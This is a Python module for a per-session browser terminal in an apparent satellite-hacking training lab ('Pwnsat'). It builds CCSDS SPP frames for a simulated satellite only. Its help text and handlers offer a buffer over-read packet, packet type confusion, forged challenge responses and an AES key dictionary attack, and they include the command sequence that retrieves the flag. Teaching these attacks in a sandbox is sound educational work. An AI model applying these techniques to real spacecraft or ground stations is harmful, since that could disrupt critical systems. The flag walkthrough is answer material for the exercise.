"""Restricted command shell for the browser terminal (per session).

This is the compatibility layer from the analysis: instead of a host shell, the
student drives a small dispatcher that builds *real* CCSDS SPP frames (via
pwnsat_protocol, the same module the workshop tools use) and feeds them to this
session's SatelliteSim over an in-process loopback.  It mirrors the command set
of cnc.py / attacks.py and tracks the AES link state like cnc.py's --secure.

It cannot reach the host: it only knows these verbs, and `send` only emits SPP
packets into one sim instance.
"""
from __future__ import annotations

import os
import sys

_TOOLS = os.path.join(os.path.dirname(os.path.dirname(os.path.abspath(__file__))), "tools")
if _TOOLS not in sys.path:
    sys.path.insert(0, _TOOLS)
import struct  # noqa: E402

import pwnsat_protocol as pp  # noqa: E402

HELP = """Pwnsat lab terminal — commands:
  help                         this message
  ping                         APID 0x01  liveness check
  status                       APID 0x0C  mission status
  version                      APID 0x03  firmware version
  mode <0-4>                   APID 0x0D  mission mode (0 SAFE..4 CONTINGENCY)
  aes on|off                   APID 0x0A  toggle the AES secure link
  debug on|off                 APID 0x10  toggle USB debug (disables AES + GS gate)
  flash-read <win> <off> <len> <unlock>   APID 0x0B  read the maintenance flash window
  broadcast <freq> <hexmsg>    APID 0x06  relay a message (bent-pipe transponder)
  payload-status               APID 0x0F  payload relay counters
  gs-mode on|off               APID 0x11  toggle geofenced ground-station mode
  gs-access challenge          APID 0x12  request an auth challenge
  gs-access respond <hex32>    APID 0x12  answer the challenge (BE 32-bit)
  xor <a> <b>                  local helper: print a XOR b (for forging responses)
  brute-force                  dictionary attack on captured encrypted telemetry (AES key)
  overread [declared_len]      craft a short packet with a large declared length (V1 over-read)
  send <apid> <hexdata>        build + send an arbitrary TC
  send-tm <apid> <hexdata>     send a command with the TM type bit set (type confusion)
  reset                        APID 0x02  software reset the satellite
  secure                       show current link state
  clear                        clear the terminal view
Numbers accept 0x.. hex or decimal.  Example to grab the flag:
  debug on
  flash-read 0xA5 83 32 0xC35A
"""


def _int(tok: str) -> int:
    return int(tok, 16) if tok.lower().startswith("0x") else int(tok, 0)


class Terminal:
    def __init__(self) -> None:
        self.secure = True   # mirror cnc.py --secure default
        self.debug = False

    @property
    def _encrypt_tc(self) -> bool:
        return self.secure and not self.debug

    def _frame(self, apid: int, data: bytes, packet_type: int = pp.SPP_TYPE_TC) -> bytes:
        payload = pp.secure_encode(data) if self._encrypt_tc else data
        spp = pp.build_spp(apid, payload, packet_type=packet_type)
        return pp.make_frame(spp)

    def execute(self, line: str) -> dict:
        """Return {echo:[str], frames:[bytes], action:str|None}."""
        line = line.strip()
        if not line:
            return {"echo": [], "frames": [], "action": None}
        parts = line.split()
        cmd, args = parts[0].lower(), parts[1:]
        try:
            return self._dispatch(cmd, args, line)
        except (ValueError, IndexError) as exc:
            return {"echo": [f"error: {exc}"], "frames": [], "action": None}

    def _dispatch(self, cmd: str, args: list[str], line: str) -> dict:
        if cmd in ("help", "?"):
            return {"echo": HELP.splitlines(), "frames": [], "action": None}
        if cmd == "clear":
            return {"echo": [], "frames": [], "action": "clear"}
        if cmd == "secure":
            return {"echo": [f"link: AES={'on' if self.secure else 'off'} "
                             f"debug={'on' if self.debug else 'off'} "
                             f"-> TC {'encrypted' if self._encrypt_tc else 'cleartext'}"],
                    "frames": [], "action": None}
        if cmd == "ping":
            return self._tx(pp.TC_APIDS["ping"], b"\x00", "ping")
        if cmd == "status":
            return self._tx(pp.TC_APIDS["status"], b"\x00", "status")
        if cmd == "version":
            return self._tx(pp.TC_APIDS["version"], b"\x00", "version")
        if cmd == "reset":
            return self._tx(pp.TC_APIDS["reset"], b"\x00", "reset")
        if cmd == "mode":
            m = _int(args[0])
            return self._tx(pp.TC_APIDS["mission"], bytes([m]), f"mission mode {m}")
        if cmd == "aes":
            on = args[0].lower() == "on"
            frame = self._tx(pp.TC_APIDS["aes"], bytes([1 if on else 0]), f"aes {'on' if on else 'off'}")
            self.secure = on  # subsequent TC encoding follows the new state
            return frame
        if cmd == "debug":
            on = args[0].lower() == "on"
            frame = self._tx(pp.TC_APIDS["debug"], bytes([1 if on else 0]), f"debug {'on' if on else 'off'}")
            self.debug = on
            return frame
        if cmd == "flash-read":
            win, off, length, unlock = (_int(a) for a in args[:4])
            data = bytes([win, off & 0xFF, (off >> 8) & 0xFF, length,
                          (unlock >> 8) & 0xFF, unlock & 0xFF])
            return self._tx(pp.TC_APIDS["flash-read"], data,
                            f"flash-read win=0x{win:02X} off={off} len={length} unlock=0x{unlock:04X}")
        if cmd == "gs-mode":
            on = args[0].lower() == "on"
            return self._tx(pp.TC_APIDS["gs-mode"], bytes([1 if on else 0]),
                            f"gs-mode {'on' if on else 'off'}")
        if cmd == "gs-access":
            sub = args[0].lower()
            if sub == "challenge":
                return self._tx(pp.TC_APIDS["gs-access"], b"\x00", "gs-access challenge")
            if sub == "respond":
                resp = _int(args[1]) & 0xFFFFFFFF
                data = b"\x01" + resp.to_bytes(4, "big")
                return self._tx(pp.TC_APIDS["gs-access"], data,
                                f"gs-access respond 0x{resp:08X}")
            raise ValueError("usage: gs-access challenge | gs-access respond <hex32>")
        if cmd == "xor":
            a, b = _int(args[0]), _int(args[1])
            return {"echo": [f"0x{a:08X} XOR 0x{b:08X} = 0x{(a ^ b) & 0xFFFFFFFF:08X}"],
                    "frames": [], "action": None}
        if cmd == "brute-force":  # handled server-side against captured ciphertext
            return {"echo": [], "frames": [], "action": "brute_force"}
        if cmd == "overread":
            declared = _int(args[0]) if args else 64
            declared = max(0, min(declared, 200))
            # version 0, type TC, APID 1; declared length but only 2 payload bytes sent
            ident = (0 << 13) | (pp.SPP_TYPE_TC << 12) | 0x001
            seq = (pp.SPP_GROUP_UNSEGMENTED << 14)
            pkt = struct.pack(">HHH", ident, seq, declared) + b"\xAA\xBB"
            return {"echo": [f"craft SPP: version=0 APID=0x001 declared_len={declared}, "
                             f"but only {len(pkt)} bytes sent -> hands to the real firmware parser"],
                    "frames": [], "action": "v1_overread", "v1_hex": pkt.hex()}
        if cmd == "broadcast":
            freq = _int(args[0]) & 0xFFFF
            msg = pp.parse_hex(args[1])
            data = freq.to_bytes(2, "big") + msg
            return self._tx(pp.TC_APIDS["broadcast"], data,
                            f"broadcast freq=0x{freq:04X} msg={len(msg)}B")
        if cmd == "payload-status":
            return self._tx(pp.TC_APIDS["payload"], b"\x00", "payload-status")
        if cmd == "send":
            apid = _int(args[0])
            data = pp.parse_hex(args[1]) if len(args) > 1 else b"\x00"
            return self._tx(apid, data, f"send APID 0x{apid:03X}")
        if cmd == "send-tm":  # type confusion: command with the TM type bit set
            apid = _int(args[0])
            data = pp.parse_hex(args[1]) if len(args) > 1 else b"\x00"
            return self._tx(apid, data, f"send-tm APID 0x{apid:03X} (declared TM)",
                            packet_type=pp.SPP_TYPE_TM)
        return {"echo": [f"unknown command: {cmd} (try 'help')"], "frames": [], "action": None}

    def _tx(self, apid: int, data: bytes, label: str,
            packet_type: int = pp.SPP_TYPE_TC) -> dict:
        frame = self._frame(apid, data, packet_type)
        mode = "encrypted" if self._encrypt_tc else "cleartext"
        tc = "TM-typed" if packet_type == pp.SPP_TYPE_TM else "TC"
        return {"echo": [f"TX {label}  [APID 0x{apid:03X}, {tc}, {mode}, {len(frame)}B frame]"],
                "frames": [frame], "action": None}
